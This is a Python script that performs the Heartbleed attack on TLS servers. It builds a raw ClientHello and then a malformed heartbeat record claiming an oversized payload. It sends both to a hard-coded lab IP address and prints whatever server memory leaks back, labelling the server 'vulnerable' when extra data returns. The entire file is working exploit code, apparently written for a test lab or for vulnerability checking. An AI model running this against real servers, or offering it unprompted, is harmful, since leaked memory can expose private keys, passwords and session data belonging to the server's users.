import sys
import struct
import socket
import time
import select
from optparse import OptionParser
helloPacket = (
'16 03 02 00 31'
'01 00 00 2d'
'03 02'
'50 0b af bb b7 5a b8 3e f0 ab 9a e3 f3 9c 63 15 33 41 37 ac fd 6c 18 1a 24 60 dc 49 67 c2 fd 96'
'00'
'00 04 '
'00 33 c0 11'
'01'
'00'
'00 00'
).replace(' ', '').decode('hex')
heartbleedPacket = (
'18 03 02 00 03'
'01 FF FF'
).replace(' ', '').decode('hex')


def dump(s):
    packetData = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in s)
    print ('%s' % (packetData))


def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def receiveTLSMessage(s, fragments = 1):
    contentType = None
    version = None
    length = None
    payload = ''

    for fragmentIndex in range(0, fragments):
        tlsHeader = recvall(s, 5)

        if tlsHeader is None:
            print ('Unexpected EOF receiving record header - server closed connection')
            return contentType, version, payload

        contentType, version, length = struct.unpack('>BHH', tlsHeader)
        payload_tmp = recvall(s, length, 5)

        if payload_tmp is None:
            print( 'Unexpected EOF receiving record payload - server closed connection')

        payload = payload + payload_tmp

    return contentType, version, payload


def exploit(s):
    s.send(heartbleedPacket)
    contentType, version, payload = receiveTLSMessage(s, 4)
    if contentType is None:
        print ('No heartbeat response received, server likely not vulnerable')
        return False
    if contentType == 24:
        print ('Received heartbeat response:')
        dump(payload)
        if len(payload) > 3:
            print ('WARNING: server returned more data than it should - server is vulnerable!')
        else:
            print ('Server processed malformed heartbeat, but did not return any extra data.')
        return True
    if contentType == 21:
        print ('Received alert:')
        dump(payload)
        print ('Server returned error, likely not vulnerable')
        print(contentType)
        return False
def main():
    server="192.168.194.129"
    port = 443
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sys.stdout.flush()
    s.connect((server,port))
    sys.stdout.flush()
    s.send(helloPacket)
    sys.stdout.flush()
    while True:
        contentType, version, payload = receiveTLSMessage(s)
        if contentType == None:
            print ('Server closed connection without sending Server Hello.')
            return
        if contentType == 22 and ord(payload[0]) == 0x0E:
            break

    sys.stdout.flush()
    exploit(s)

if __name__ == '__main__':
    main()
